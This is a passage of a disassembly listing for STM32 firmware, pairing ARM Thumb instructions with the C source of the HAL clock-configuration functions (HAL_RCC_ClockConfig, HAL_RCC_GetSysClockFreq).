 8004342:	d1f0      	bne.n	8004326 <HAL_RCC_OscConfig+0x7e6>
        }
        /* Unselect main PLL clock source and disable main PLL outputs to save power */
#if defined(RCC_PLLSAI2_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI3CLK);
#elif defined(RCC_PLLSAI1_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI2CLK);
 8004344:	4b06      	ldr	r3, [pc, #24]	; (8004360 <HAL_RCC_OscConfig+0x820>)
 8004346:	68da      	ldr	r2, [r3, #12]
 8004348:	4905      	ldr	r1, [pc, #20]	; (8004360 <HAL_RCC_OscConfig+0x820>)
 800434a:	4b06      	ldr	r3, [pc, #24]	; (8004364 <HAL_RCC_OscConfig+0x824>)
 800434c:	4013      	ands	r3, r2
 800434e:	60cb      	str	r3, [r1, #12]
 8004350:	e001      	b.n	8004356 <HAL_RCC_OscConfig+0x816>
#endif /* RCC_PLLSAI2_SUPPORT */
      }
      else
      {
        /* PLL is already used as System core clock */
        return HAL_ERROR;
 8004352:	2301      	movs	r3, #1
 8004354:	e000      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
      }
    }
  }
  return HAL_OK;
 8004356:	2300      	movs	r3, #0
}
 8004358:	4618      	mov	r0, r3
 800435a:	3720      	adds	r7, #32
 800435c:	46bd      	mov	sp, r7
 800435e:	bd80      	pop	{r7, pc}
 8004360:	40021000 	.word	0x40021000
 8004364:	feeefffc 	.word	0xfeeefffc

08004368 <HAL_RCC_ClockConfig>:
  *         HPRE[3:0] bits to ensure that HCLK not exceed the maximum allowed frequency
  *         (for more details refer to section above "Initialization/de-initialization functions")
  * @retval None
  */
HAL_StatusTypeDef HAL_RCC_ClockConfig(RCC_ClkInitTypeDef  *RCC_ClkInitStruct, uint32_t FLatency)
{
 8004368:	b580      	push	{r7, lr}
 800436a:	b084      	sub	sp, #16
 800436c:	af00      	add	r7, sp, #0
 800436e:	6078      	str	r0, [r7, #4]
 8004370:	6039      	str	r1, [r7, #0]
  uint32_t hpre = RCC_SYSCLK_DIV1;
#endif
  HAL_StatusTypeDef status;

  /* Check Null pointer */
  if(RCC_ClkInitStruct == NULL)
 8004372:	687b      	ldr	r3, [r7, #4]
 8004374:	2b00      	cmp	r3, #0
 8004376:	d101      	bne.n	800437c <HAL_RCC_ClockConfig+0x14>
  {
    return HAL_ERROR;
 8004378:	2301      	movs	r3, #1
 800437a:	e0e7      	b.n	800454c <HAL_RCC_ClockConfig+0x1e4>
  /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
    must be correctly programmed according to the frequency of the CPU clock
    (HCLK) and the supply voltage of the device. */

  /* Increasing the number of wait states because of higher CPU frequency */
  if(FLatency > __HAL_FLASH_GET_LATENCY())
 800437c:	4b75      	ldr	r3, [pc, #468]	; (8004554 <HAL_RCC_ClockConfig+0x1ec>)
 800437e:	681b      	ldr	r3, [r3, #0]
 8004380:	f003 0307 	and.w	r3, r3, #7
 8004384:	683a      	ldr	r2, [r7, #0]
 8004386:	429a      	cmp	r2, r3
 8004388:	d910      	bls.n	80043ac <HAL_RCC_ClockConfig+0x44>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 800438a:	4b72      	ldr	r3, [pc, #456]	; (8004554 <HAL_RCC_ClockConfig+0x1ec>)
 800438c:	681b      	ldr	r3, [r3, #0]
 800438e:	f023 0207 	bic.w	r2, r3, #7
 8004392:	4970      	ldr	r1, [pc, #448]	; (8004554 <HAL_RCC_ClockConfig+0x1ec>)
 8004394:	683b      	ldr	r3, [r7, #0]
 8004396:	4313      	orrs	r3, r2
 8004398:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 800439a:	4b6e      	ldr	r3, [pc, #440]	; (8004554 <HAL_RCC_ClockConfig+0x1ec>)
 800439c:	681b      	ldr	r3, [r3, #0]
 800439e:	f003 0307 	and.w	r3, r3, #7
 80043a2:	683a      	ldr	r2, [r7, #0]
 80043a4:	429a      	cmp	r2, r3
 80043a6:	d001      	beq.n	80043ac <HAL_RCC_ClockConfig+0x44>
    {
      return HAL_ERROR;
 80043a8:	2301      	movs	r3, #1
 80043aa:	e0cf      	b.n	800454c <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*----------------- HCLK Configuration prior to SYSCLK----------------------*/
  /* Apply higher HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is increased */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 80043ac:	687b      	ldr	r3, [r7, #4]
 80043ae:	681b      	ldr	r3, [r3, #0]
 80043b0:	f003 0302 	and.w	r3, r3, #2
 80043b4:	2b00      	cmp	r3, #0
 80043b6:	d010      	beq.n	80043da <HAL_RCC_ClockConfig+0x72>
  {
    assert_param(IS_RCC_HCLK(RCC_ClkInitStruct->AHBCLKDivider));

    if(RCC_ClkInitStruct->AHBCLKDivider > READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 80043b8:	687b      	ldr	r3, [r7, #4]
 80043ba:	689a      	ldr	r2, [r3, #8]
 80043bc:	4b66      	ldr	r3, [pc, #408]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 80043be:	689b      	ldr	r3, [r3, #8]
 80043c0:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 80043c4:	429a      	cmp	r2, r3
 80043c6:	d908      	bls.n	80043da <HAL_RCC_ClockConfig+0x72>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 80043c8:	4b63      	ldr	r3, [pc, #396]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 80043ca:	689b      	ldr	r3, [r3, #8]
 80043cc:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 80043d0:	687b      	ldr	r3, [r7, #4]
 80043d2:	689b      	ldr	r3, [r3, #8]
 80043d4:	4960      	ldr	r1, [pc, #384]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 80043d6:	4313      	orrs	r3, r2
 80043d8:	608b      	str	r3, [r1, #8]
    }
  }

  /*------------------------- SYSCLK Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_SYSCLK) == RCC_CLOCKTYPE_SYSCLK)
 80043da:	687b      	ldr	r3, [r7, #4]
 80043dc:	681b      	ldr	r3, [r3, #0]
 80043de:	f003 0301 	and.w	r3, r3, #1
 80043e2:	2b00      	cmp	r3, #0
 80043e4:	d04c      	beq.n	8004480 <HAL_RCC_ClockConfig+0x118>
  {
    assert_param(IS_RCC_SYSCLKSOURCE(RCC_ClkInitStruct->SYSCLKSource));

    /* PLL is selected as System Clock Source */
    if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_PLLCLK)
 80043e6:	687b      	ldr	r3, [r7, #4]
 80043e8:	685b      	ldr	r3, [r3, #4]
 80043ea:	2b03      	cmp	r3, #3
 80043ec:	d107      	bne.n	80043fe <HAL_RCC_ClockConfig+0x96>
    {
      /* Check the PLL ready flag */
      if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80043ee:	4b5a      	ldr	r3, [pc, #360]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 80043f0:	681b      	ldr	r3, [r3, #0]
 80043f2:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80043f6:	2b00      	cmp	r3, #0
 80043f8:	d121      	bne.n	800443e <HAL_RCC_ClockConfig+0xd6>
      {
        return HAL_ERROR;
 80043fa:	2301      	movs	r3, #1
 80043fc:	e0a6      	b.n	800454c <HAL_RCC_ClockConfig+0x1e4>
#endif
    }
    else
    {
      /* HSE is selected as System Clock Source */
      if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_HSE)
 80043fe:	687b      	ldr	r3, [r7, #4]
 8004400:	685b      	ldr	r3, [r3, #4]
 8004402:	2b02      	cmp	r3, #2
 8004404:	d107      	bne.n	8004416 <HAL_RCC_ClockConfig+0xae>
      {
        /* Check the HSE ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8004406:	4b54      	ldr	r3, [pc, #336]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 8004408:	681b      	ldr	r3, [r3, #0]
 800440a:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 800440e:	2b00      	cmp	r3, #0
 8004410:	d115      	bne.n	800443e <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 8004412:	2301      	movs	r3, #1
 8004414:	e09a      	b.n	800454c <HAL_RCC_ClockConfig+0x1e4>
        }
      }
      /* MSI is selected as System Clock Source */
      else if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_MSI)
 8004416:	687b      	ldr	r3, [r7, #4]
 8004418:	685b      	ldr	r3, [r3, #4]
 800441a:	2b00      	cmp	r3, #0
 800441c:	d107      	bne.n	800442e <HAL_RCC_ClockConfig+0xc6>
      {
        /* Check the MSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 800441e:	4b4e      	ldr	r3, [pc, #312]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 8004420:	681b      	ldr	r3, [r3, #0]
 8004422:	f003 0302 	and.w	r3, r3, #2
 8004426:	2b00      	cmp	r3, #0
 8004428:	d109      	bne.n	800443e <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 800442a:	2301      	movs	r3, #1
 800442c:	e08e      	b.n	800454c <HAL_RCC_ClockConfig+0x1e4>
      }
      /* HSI is selected as System Clock Source */
      else
      {
        /* Check the HSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 800442e:	4b4a      	ldr	r3, [pc, #296]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 8004430:	681b      	ldr	r3, [r3, #0]
 8004432:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8004436:	2b00      	cmp	r3, #0
 8004438:	d101      	bne.n	800443e <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 800443a:	2301      	movs	r3, #1
 800443c:	e086      	b.n	800454c <HAL_RCC_ClockConfig+0x1e4>
      }
#endif

    }

    MODIFY_REG(RCC->CFGR, RCC_CFGR_SW, RCC_ClkInitStruct->SYSCLKSource);
 800443e:	4b46      	ldr	r3, [pc, #280]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 8004440:	689b      	ldr	r3, [r3, #8]
 8004442:	f023 0203 	bic.w	r2, r3, #3
 8004446:	687b      	ldr	r3, [r7, #4]
 8004448:	685b      	ldr	r3, [r3, #4]
 800444a:	4943      	ldr	r1, [pc, #268]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 800444c:	4313      	orrs	r3, r2
 800444e:	608b      	str	r3, [r1, #8]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004450:	f7fc fff2 	bl	8001438 <HAL_GetTick>
 8004454:	60f8      	str	r0, [r7, #12]

    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 8004456:	e00a      	b.n	800446e <HAL_RCC_ClockConfig+0x106>
    {
      if((HAL_GetTick() - tickstart) > CLOCKSWITCH_TIMEOUT_VALUE)
 8004458:	f7fc ffee 	bl	8001438 <HAL_GetTick>
 800445c:	4602      	mov	r2, r0
 800445e:	68fb      	ldr	r3, [r7, #12]
 8004460:	1ad3      	subs	r3, r2, r3
 8004462:	f241 3288 	movw	r2, #5000	; 0x1388
 8004466:	4293      	cmp	r3, r2
 8004468:	d901      	bls.n	800446e <HAL_RCC_ClockConfig+0x106>
      {
        return HAL_TIMEOUT;
 800446a:	2303      	movs	r3, #3
 800446c:	e06e      	b.n	800454c <HAL_RCC_ClockConfig+0x1e4>
    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 800446e:	4b3a      	ldr	r3, [pc, #232]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 8004470:	689b      	ldr	r3, [r3, #8]
 8004472:	f003 020c 	and.w	r2, r3, #12
 8004476:	687b      	ldr	r3, [r7, #4]
 8004478:	685b      	ldr	r3, [r3, #4]
 800447a:	009b      	lsls	r3, r3, #2
 800447c:	429a      	cmp	r2, r3
 800447e:	d1eb      	bne.n	8004458 <HAL_RCC_ClockConfig+0xf0>
  }
#endif

  /*----------------- HCLK Configuration after SYSCLK-------------------------*/
  /* Apply lower HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is set */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 8004480:	687b      	ldr	r3, [r7, #4]
 8004482:	681b      	ldr	r3, [r3, #0]
 8004484:	f003 0302 	and.w	r3, r3, #2
 8004488:	2b00      	cmp	r3, #0
 800448a:	d010      	beq.n	80044ae <HAL_RCC_ClockConfig+0x146>
  {
    if(RCC_ClkInitStruct->AHBCLKDivider < READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 800448c:	687b      	ldr	r3, [r7, #4]
 800448e:	689a      	ldr	r2, [r3, #8]
 8004490:	4b31      	ldr	r3, [pc, #196]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 8004492:	689b      	ldr	r3, [r3, #8]
 8004494:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8004498:	429a      	cmp	r2, r3
 800449a:	d208      	bcs.n	80044ae <HAL_RCC_ClockConfig+0x146>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 800449c:	4b2e      	ldr	r3, [pc, #184]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 800449e:	689b      	ldr	r3, [r3, #8]
 80044a0:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 80044a4:	687b      	ldr	r3, [r7, #4]
 80044a6:	689b      	ldr	r3, [r3, #8]
 80044a8:	492b      	ldr	r1, [pc, #172]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 80044aa:	4313      	orrs	r3, r2
 80044ac:	608b      	str	r3, [r1, #8]
    }
  }

  /* Allow decreasing of the number of wait states (because of lower CPU frequency expected) */
  if(FLatency < __HAL_FLASH_GET_LATENCY())
 80044ae:	4b29      	ldr	r3, [pc, #164]	; (8004554 <HAL_RCC_ClockConfig+0x1ec>)
 80044b0:	681b      	ldr	r3, [r3, #0]
 80044b2:	f003 0307 	and.w	r3, r3, #7
 80044b6:	683a      	ldr	r2, [r7, #0]
 80044b8:	429a      	cmp	r2, r3
 80044ba:	d210      	bcs.n	80044de <HAL_RCC_ClockConfig+0x176>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 80044bc:	4b25      	ldr	r3, [pc, #148]	; (8004554 <HAL_RCC_ClockConfig+0x1ec>)
 80044be:	681b      	ldr	r3, [r3, #0]
 80044c0:	f023 0207 	bic.w	r2, r3, #7
 80044c4:	4923      	ldr	r1, [pc, #140]	; (8004554 <HAL_RCC_ClockConfig+0x1ec>)
 80044c6:	683b      	ldr	r3, [r7, #0]
 80044c8:	4313      	orrs	r3, r2
 80044ca:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 80044cc:	4b21      	ldr	r3, [pc, #132]	; (8004554 <HAL_RCC_ClockConfig+0x1ec>)
 80044ce:	681b      	ldr	r3, [r3, #0]
 80044d0:	f003 0307 	and.w	r3, r3, #7
 80044d4:	683a      	ldr	r2, [r7, #0]
 80044d6:	429a      	cmp	r2, r3
 80044d8:	d001      	beq.n	80044de <HAL_RCC_ClockConfig+0x176>
    {
      return HAL_ERROR;
 80044da:	2301      	movs	r3, #1
 80044dc:	e036      	b.n	800454c <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*-------------------------- PCLK1 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK1) == RCC_CLOCKTYPE_PCLK1)
 80044de:	687b      	ldr	r3, [r7, #4]
 80044e0:	681b      	ldr	r3, [r3, #0]
 80044e2:	f003 0304 	and.w	r3, r3, #4
 80044e6:	2b00      	cmp	r3, #0
 80044e8:	d008      	beq.n	80044fc <HAL_RCC_ClockConfig+0x194>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB1CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE1, RCC_ClkInitStruct->APB1CLKDivider);
 80044ea:	4b1b      	ldr	r3, [pc, #108]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 80044ec:	689b      	ldr	r3, [r3, #8]
 80044ee:	f423 62e0 	bic.w	r2, r3, #1792	; 0x700
 80044f2:	687b      	ldr	r3, [r7, #4]
 80044f4:	68db      	ldr	r3, [r3, #12]
 80044f6:	4918      	ldr	r1, [pc, #96]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 80044f8:	4313      	orrs	r3, r2
 80044fa:	608b      	str	r3, [r1, #8]
  }

  /*-------------------------- PCLK2 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK2) == RCC_CLOCKTYPE_PCLK2)
 80044fc:	687b      	ldr	r3, [r7, #4]
 80044fe:	681b      	ldr	r3, [r3, #0]
 8004500:	f003 0308 	and.w	r3, r3, #8
 8004504:	2b00      	cmp	r3, #0
 8004506:	d009      	beq.n	800451c <HAL_RCC_ClockConfig+0x1b4>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB2CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE2, ((RCC_ClkInitStruct->APB2CLKDivider) << 3U));
 8004508:	4b13      	ldr	r3, [pc, #76]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 800450a:	689b      	ldr	r3, [r3, #8]
 800450c:	f423 5260 	bic.w	r2, r3, #14336	; 0x3800
 8004510:	687b      	ldr	r3, [r7, #4]
 8004512:	691b      	ldr	r3, [r3, #16]
 8004514:	00db      	lsls	r3, r3, #3
 8004516:	4910      	ldr	r1, [pc, #64]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 8004518:	4313      	orrs	r3, r2
 800451a:	608b      	str	r3, [r1, #8]
  }

  /* Update the SystemCoreClock global variable */
  SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 800451c:	f000 f824 	bl	8004568 <HAL_RCC_GetSysClockFreq>
 8004520:	4602      	mov	r2, r0
 8004522:	4b0d      	ldr	r3, [pc, #52]	; (8004558 <HAL_RCC_ClockConfig+0x1f0>)
 8004524:	689b      	ldr	r3, [r3, #8]
 8004526:	091b      	lsrs	r3, r3, #4
 8004528:	f003 030f 	and.w	r3, r3, #15
 800452c:	490b      	ldr	r1, [pc, #44]	; (800455c <HAL_RCC_ClockConfig+0x1f4>)
 800452e:	5ccb      	ldrb	r3, [r1, r3]
 8004530:	f003 031f 	and.w	r3, r3, #31
 8004534:	fa22 f303 	lsr.w	r3, r2, r3
 8004538:	4a09      	ldr	r2, [pc, #36]	; (8004560 <HAL_RCC_ClockConfig+0x1f8>)
 800453a:	6013      	str	r3, [r2, #0]

  /* Configure the source of time base considering new system clocks settings*/
  status = HAL_InitTick(uwTickPrio);
 800453c:	4b09      	ldr	r3, [pc, #36]	; (8004564 <HAL_RCC_ClockConfig+0x1fc>)
 800453e:	681b      	ldr	r3, [r3, #0]
 8004540:	4618      	mov	r0, r3
 8004542:	f7fc ff29 	bl	8001398 <HAL_InitTick>
 8004546:	4603      	mov	r3, r0
 8004548:	72fb      	strb	r3, [r7, #11]

  return status;
 800454a:	7afb      	ldrb	r3, [r7, #11]
}
 800454c:	4618      	mov	r0, r3
 800454e:	3710      	adds	r7, #16
 8004550:	46bd      	mov	sp, r7
 8004552:	bd80      	pop	{r7, pc}
 8004554:	40022000 	.word	0x40022000
 8004558:	40021000 	.word	0x40021000
 800455c:	0800d4bc 	.word	0x0800d4bc
 8004560:	20000000 	.word	0x20000000
 8004564:	20000004 	.word	0x20000004

08004568 <HAL_RCC_GetSysClockFreq>:
  *
  *
  * @retval SYSCLK frequency
  */
uint32_t HAL_RCC_GetSysClockFreq(void)
{
 8004568:	b480      	push	{r7}
 800456a:	b089      	sub	sp, #36	; 0x24
 800456c:	af00      	add	r7, sp, #0
  uint32_t msirange = 0U, sysclockfreq = 0U;
 800456e:	2300      	movs	r3, #0
 8004570:	61fb      	str	r3, [r7, #28]
 8004572:	2300      	movs	r3, #0
 8004574:	61bb      	str	r3, [r7, #24]
  uint32_t pllvco, pllsource, pllr, pllm;    /* no init needed */
  uint32_t sysclk_source, pll_oscsource;

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 8004576:	4b3e      	ldr	r3, [pc, #248]	; (8004670 <HAL_RCC_GetSysClockFreq+0x108>)
 8004578:	689b      	ldr	r3, [r3, #8]
 800457a:	f003 030c 	and.w	r3, r3, #12
 800457e:	613b      	str	r3, [r7, #16]
  pll_oscsource = __HAL_RCC_GET_PLL_OSCSOURCE();
 8004580:	4b3b      	ldr	r3, [pc, #236]	; (8004670 <HAL_RCC_GetSysClockFreq+0x108>)
 8004582:	68db      	ldr	r3, [r3, #12]
 8004584:	f003 0303 	and.w	r3, r3, #3
 8004588:	60fb      	str	r3, [r7, #12]

  if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 800458a:	693b      	ldr	r3, [r7, #16]
 800458c:	2b00      	cmp	r3, #0
 800458e:	d005      	beq.n	800459c <HAL_RCC_GetSysClockFreq+0x34>
 8004590:	693b      	ldr	r3, [r7, #16]
 8004592:	2b0c      	cmp	r3, #12
 8004594:	d121      	bne.n	80045da <HAL_RCC_GetSysClockFreq+0x72>
     ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_oscsource == RCC_PLLSOURCE_MSI)))
 8004596:	68fb      	ldr	r3, [r7, #12]
 8004598:	2b01      	cmp	r3, #1
 800459a:	d11e      	bne.n	80045da <HAL_RCC_GetSysClockFreq+0x72>
  {
    /* MSI or PLL with MSI source used as system clock source */

    /* Get SYSCLK source */
    if(READ_BIT(RCC->CR, RCC_CR_MSIRGSEL) == 0U)
 800459c:	4b34      	ldr	r3, [pc, #208]	; (8004670 <HAL_RCC_GetSysClockFreq+0x108>)
 800459e:	681b      	ldr	r3, [r3, #0]
 80045a0:	f003 0308 	and.w	r3, r3, #8
 80045a4:	2b00      	cmp	r3, #0
 80045a6:	d107      	bne.n	80045b8 <HAL_RCC_GetSysClockFreq+0x50>
    { /* MSISRANGE from RCC_CSR applies */
      msirange = READ_BIT(RCC->CSR, RCC_CSR_MSISRANGE) >> RCC_CSR_MSISRANGE_Pos;
 80045a8:	4b31      	ldr	r3, [pc, #196]	; (8004670 <HAL_RCC_GetSysClockFreq+0x108>)
 80045aa:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 80045ae:	0a1b      	lsrs	r3, r3, #8
 80045b0:	f003 030f 	and.w	r3, r3, #15
 80045b4:	61fb      	str	r3, [r7, #28]
 80045b6:	e005      	b.n	80045c4 <HAL_RCC_GetSysClockFreq+0x5c>
    }
    else
    { /* MSIRANGE from RCC_CR applies */
      msirange = READ_BIT(RCC->CR, RCC_CR_MSIRANGE) >> RCC_CR_MSIRANGE_Pos;
 80045b8:	4b2d      	ldr	r3, [pc, #180]	; (8004670 <HAL_RCC_GetSysClockFreq+0x108>)
 80045ba:	681b      	ldr	r3, [r3, #0]
 80045bc:	091b      	lsrs	r3, r3, #4
 80045be:	f003 030f 	and.w	r3, r3, #15
 80045c2:	61fb      	str	r3, [r7, #28]
    }
    /*MSI frequency range in HZ*/
    msirange = MSIRangeTable[msirange];
 80045c4:	4a2b      	ldr	r2, [pc, #172]	; (8004674 <HAL_RCC_GetSysClockFreq+0x10c>)
 80045c6:	69fb      	ldr	r3, [r7, #28]
 80045c8:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 80045cc:	61fb      	str	r3, [r7, #28]

    if(sysclk_source == RCC_CFGR_SWS_MSI)
 80045ce:	693b      	ldr	r3, [r7, #16]
 80045d0:	2b00      	cmp	r3, #0
 80045d2:	d10d      	bne.n	80045f0 <HAL_RCC_GetSysClockFreq+0x88>
    {
      /* MSI used as system clock source */
      sysclockfreq = msirange;
 80045d4:	69fb      	ldr	r3, [r7, #28]
 80045d6:	61bb      	str	r3, [r7, #24]
    if(sysclk_source == RCC_CFGR_SWS_MSI)
 80045d8:	e00a      	b.n	80045f0 <HAL_RCC_GetSysClockFreq+0x88>
    }
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSI)
 80045da:	693b      	ldr	r3, [r7, #16]
 80045dc:	2b04      	cmp	r3, #4
 80045de:	d102      	bne.n	80045e6 <HAL_RCC_GetSysClockFreq+0x7e>
  {
    /* HSI used as system clock source */
    sysclockfreq = HSI_VALUE;
 80045e0:	4b25      	ldr	r3, [pc, #148]	; (8004678 <HAL_RCC_GetSysClockFreq+0x110>)
 80045e2:	61bb      	str	r3, [r7, #24]
 80045e4:	e004      	b.n	80045f0 <HAL_RCC_GetSysClockFreq+0x88>
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSE)
 80045e6:	693b      	ldr	r3, [r7, #16]
 80045e8:	2b08      	cmp	r3, #8
 80045ea:	d101      	bne.n	80045f0 <HAL_RCC_GetSysClockFreq+0x88>
  {
    /* HSE used as system clock source */
    sysclockfreq = HSE_VALUE;
 80045ec:	4b23      	ldr	r3, [pc, #140]	; (800467c <HAL_RCC_GetSysClockFreq+0x114>)
 80045ee:	61bb      	str	r3, [r7, #24]
  else
  {
    /* unexpected case: sysclockfreq at 0 */
  }

  if(sysclk_source == RCC_CFGR_SWS_PLL)
 80045f0:	693b      	ldr	r3, [r7, #16]
 80045f2:	2b0c      	cmp	r3, #12
 80045f4:	d134      	bne.n	8004660 <HAL_RCC_GetSysClockFreq+0xf8>
    /* PLL used as system clock  source */

    /* PLL_VCO = (HSE_VALUE or HSI_VALUE or MSI_VALUE) * PLLN / PLLM
    SYSCLK = PLL_VCO / PLLR
    */
    pllsource = READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC);
 80045f6:	4b1e      	ldr	r3, [pc, #120]	; (8004670 <HAL_RCC_GetSysClockFreq+0x108>)
 80045f8:	68db      	ldr	r3, [r3, #12]
 80045fa:	f003 0303 	and.w	r3, r3, #3
 80045fe:	60bb      	str	r3, [r7, #8]

    switch (pllsource)
 8004600:	68bb      	ldr	r3, [r7, #8]
 8004602:	2b02      	cmp	r3, #2
 8004604:	d003      	beq.n	800460e <HAL_RCC_GetSysClockFreq+0xa6>
 8004606:	68bb      	ldr	r3, [r7, #8]
 8004608:	2b03      	cmp	r3, #3
 800460a:	d003      	beq.n	8004614 <HAL_RCC_GetSysClockFreq+0xac>
 800460c:	e005      	b.n	800461a <HAL_RCC_GetSysClockFreq+0xb2>
    {
    case RCC_PLLSOURCE_HSI:  /* HSI used as PLL clock source */
      pllvco = HSI_VALUE;
 800460e:	4b1a      	ldr	r3, [pc, #104]	; (8004678 <HAL_RCC_GetSysClockFreq+0x110>)
 8004610:	617b      	str	r3, [r7, #20]
      break;
 8004612:	e005      	b.n	8004620 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_HSE:  /* HSE used as PLL clock source */
      pllvco = HSE_VALUE;
 8004614:	4b19      	ldr	r3, [pc, #100]	; (800467c <HAL_RCC_GetSysClockFreq+0x114>)
 8004616:	617b      	str	r3, [r7, #20]
      break;
 8004618:	e002      	b.n	8004620 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_MSI:  /* MSI used as PLL clock source */
    default:
      pllvco = msirange;
 800461a:	69fb      	ldr	r3, [r7, #28]
 800461c:	617b      	str	r3, [r7, #20]
      break;
 800461e:	bf00      	nop
    }
    pllm = (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U ;
 8004620:	4b13      	ldr	r3, [pc, #76]	; (8004670 <HAL_RCC_GetSysClockFreq+0x108>)
 8004622:	68db      	ldr	r3, [r3, #12]
 8004624:	091b      	lsrs	r3, r3, #4
 8004626:	f003 0307 	and.w	r3, r3, #7
 800462a:	3301      	adds	r3, #1
 800462c:	607b      	str	r3, [r7, #4]
    pllvco = (pllvco * (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLN) >> RCC_PLLCFGR_PLLN_Pos)) / pllm;
 800462e:	4b10      	ldr	r3, [pc, #64]	; (8004670 <HAL_RCC_GetSysClockFreq+0x108>)
 8004630:	68db      	ldr	r3, [r3, #12]
 8004632:	0a1b      	lsrs	r3, r3, #8
 8004634:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 8004638:	697a      	ldr	r2, [r7, #20]
 800463a:	fb03 f202 	mul.w	r2, r3, r2
